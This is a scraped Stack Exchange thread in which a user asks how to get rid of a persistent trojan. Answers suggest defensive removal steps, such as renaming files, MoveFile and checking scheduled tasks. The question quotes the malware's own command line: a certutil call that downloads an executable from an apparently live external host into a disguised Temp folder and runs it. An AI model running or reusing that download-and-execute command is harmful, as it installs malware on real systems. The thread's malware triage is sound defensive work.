{
    "title": "Why Windows Defender is not able to get rid of this trojan?",
    "link": "https://reverseengineering.stackexchange.com/questions/22690/why-windows-defender-is-not-able-to-get-rid-of-this-trojan",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  Every time I start my PC, Windows Defender shows a notification saying that the virus Trojan:Win32/Ceprolad.A was deleted, which means indeed that it wasn't, as most antivirus I've tried these days (Panda, Avast...)\n </p>\n <p>\n  The details of this thread are:\n </p>\n <blockquote>\n  <p>\n   CmdLine: C:\\Windows\\System32\\cmd.exe /C certutil.exe -urlcache -split\n  -f\n   <a href=\"http://tfortytimes.com/app/app.exe\" rel=\"nofollow noreferrer\">\n    http://tfortytimes.com/app/app.exe\n   </a>\n   C:\\Users\\NMolinero\\AppData\\Local\\Temp\\csrss\\scheduled.exe &&\n  C:\\Users\\NMolinero\\AppData\\Local\\Temp\\csrss\\scheduled.exe /31340\n  </p>\n </blockquote>\n <p>\n  I'd like to find it and delete it, instead of just restoring my Windows OS to a previous point, so I was thinking to debug the code using IDA, Ollydbg... but I'm quite new on this, so I'm not sure how to get a sample of the malware to analyze it (I have a virtual machine for that) or if there is a better way to do it.\n </p>\n <p>\n  Any suggestions will be welcome!\n </p>\n</div>\n</body></html>",
    "votes": "1",
    "answers": 2,
    "views": "2k",
    "tags": [
        "ida",
        "assembly",
        "debugging",
        "malware",
        "static-analysis"
    ],
    "user": "Natiya",
    "time": "Dec 9, 2019 at 10:03",
    "comments": [
        {
            "user": "0xC0000022L",
            "text": "<html><body><span class=\"comment-copy\">\n Hi and welcome to RE.SE. This isn't exactly a reverse engineering question ... but I'll add an answer in an attempt to help you out.\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "0xC0000022L",
            "text": "<html><body><span class=\"comment-copy\">\n Btw, I find it puzzling that the action Windows Defender takes doesn't really get rid of this thing. Windows Defender has both the service running with TCB privileges and a kernel mode driver which should be more than capable to intercept the malware and foil countermeasures that would typically prevent deletion of the malware.\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I am assuming that the malware is already on your disk (not all malware hits the disk!). So keep that in mind when following this answer. If this is not the case, please provide more information.\n </p>\n <p>\n  On Windows many files that are in use and therefore cannot be deleted can be dealt in one of two ways:\n </p>\n <ol>\n  <li>\n   rename the file (the\n   <code>\n    ren\n   </code>\n   command on the command prompt should help)\n  </li>\n  <li>\n   failing 1., a tool such as\n   <a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/movefile\" rel=\"nofollow noreferrer\">\n    MoveFile\n   </a>\n   can be used to tell the session manager (\n   <code>\n    smss.exe\n   </code>\n   ) to move the file early during a boot\n  </li>\n </ol>\n <p>\n  By renaming the file you can oftentimes ensure that next time an attempt is made to load the malware, it will fail. However, if there is some kind of dropper involved, attempting to download this malware time and time again, this may fail.\n </p>\n <p>\n  In such a case you can attempt a variation on the two above methods. You can create a directory of the same name as the malware file or conversely a file if this concerns a directory. So given the path\n  <code>\n   C:\\Users\\NMolinero\\AppData\\Local\\Temp\\csrss\\scheduled.exe\n  </code>\n  you have two options:\n </p>\n <ol>\n  <li>\n   rename the\n   <code>\n    C:\\Users\\NMolinero\\AppData\\Local\\Temp\\csrss\n   </code>\n   to something else and then create a\n   <em>\n    file\n   </em>\n   with that same full path in its stead.\n  </li>\n  <li>\n   rename the file\n   <code>\n    C:\\Users\\NMolinero\\AppData\\Local\\Temp\\csrss\\scheduled.exe\n   </code>\n   and create a\n   <em>\n    directory\n   </em>\n   with that exact same full path in its stead (yes, a folder with the\n   <code>\n    .exe\n   </code>\n   file extension).\n  </li>\n </ol>\n <p>\n  For the MoveFile method I am mentioning above, you may have to create a folder of some arbitrary name and use MoveFile to rename it to\n  <code>\n   C:\\Users\\NMolinero\\AppData\\Local\\Temp\\csrss\n  </code>\n  or\n  <code>\n   C:\\Users\\NMolinero\\AppData\\Local\\Temp\\csrss\\scheduled.exe\n  </code>\n  respectively. That is, depending on the exact behavior you observe you may have to deviate slightly from the \"overall\" methods I am outlining.\n </p>\n <p>\n  In theory all of this can still fail. We can reasonably assume that the file paths you gave are the\n  <em>\n   actual\n  </em>\n  file paths of the malware entities, since they appear in the context of a command being executed. In general it would also be possible for a malware to camouflage itself by using a path or file name that is invalid in terms of the Win32 subsystem (see\n  <a href=\"https://googleprojectzero.blogspot.com/2016/02/the-definitive-guide-on-win32-to-nt.html\" rel=\"nofollow noreferrer\">\n   here\n  </a>\n  ). In this case you would have to use one of the alternative path notations (explained in the linked article) in order to escape the path conversion and \"vetting\" at the Win32 subsystem layer.\n </p>\n <p>\n  Failing all of the above you may want to pick up a recent live CD (Linux Mint, Ubuntu, whatever ...) with support for the NTFS file system (I have to\n  <em>\n   assume\n  </em>\n  once again here), in order to make the above mentioned modifications while your Windows system (and therefore the malware) lies dormant.\n </p>\n <p>\n  After you're done with these steps you should be able to extract the malware and perform whatever static analysis you want with whichever tool you prefer.\n </p>\n <hr/>\n <p>\n  If MoveFile fails or you cannot use it for whatever reason, you could always attempt to schedule the move operation via the\n  <code>\n   PendingFileRenameOperations\n  </code>\n  registry value. But frankly if the malware prevents you from using something like MoveFile or the registry editor you may want to use the \"offline\" method I described as last resort.\n </p>\n</div>\n</body></html>",
            "votes": "3",
            "user": "0xC0000022L",
            "time": "Dec 9, 2019 at 10:00",
            "is_accepted": false,
            "comments": [
                {
                    "user": "Natiya",
                    "text": "<span class=\"comment-copy\">thanks a lot for your answer, but I'm afraid that folder isn't in my system. I've tried the different formats suggested in the link, but can't find it. Also, I searched for the file \"scheduled.exe\" in my C:/ folder, and it's not there...I downloaded the app.exe in my virtual machine from the link in the commands and I saw it uses functions from Kernel32, User32 and ntdll.dll. However, I'm not sure how to continue.</span>",
                    "time": null
                },
                {
                    "user": "0xC0000022L",
                    "text": "<span class=\"comment-copy\">@Natiya Did you make sure to configure Windows Explorer accordingly to show hidden items? Also, have you tried searching the volume while Windows was offline, from Linux for example. E.g. via <code>find /path/to/windows/drivec -type f -iname scheduled.exe</code> ...?</span>",
                    "time": null
                },
                {
                    "user": "Natiya",
                    "text": "<span class=\"comment-copy\">thanks a lot!! I have my system to show all hidden folders and files. I'm not sure how to do the search that you suggest. Anyway, I downloaded the file in my virtual machine and I can debug it because it's packed and all I see is assembler. Also, I have the feeling that the folder and the scheduled.exe are deleted after execution. This malware affects the browser by showing adds</span>",
                    "time": null
                }
            ]
        },
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  Based on that command-line, I think that there's a scheduled task (or WMI entry) that is running periodically to download the file again, which is why it's not being removed.  Defender might not be searching those locations without a full scan, for performance reasons.\n </p>\n</div>\n</body></html>",
            "votes": "1",
            "user": "peter ferrie",
            "time": "Dec 13, 2019 at 19:59",
            "is_accepted": false,
            "comments": [
                {
                    "user": "Natiya",
                    "text": "<span class=\"comment-copy\">Yes! Thanks to Ccleaner I saw in the startup services (in Windows startup services it isn't shown) those commands and found they are a scheduled task run everytime the user logs in. I'd like to write  script to copy the folder crss when I log in before it gets deleted so I can see the malware before deleting that task. Do you think it's a good idea?</span>",
                    "time": null
                }
            ]
        }
    ]
}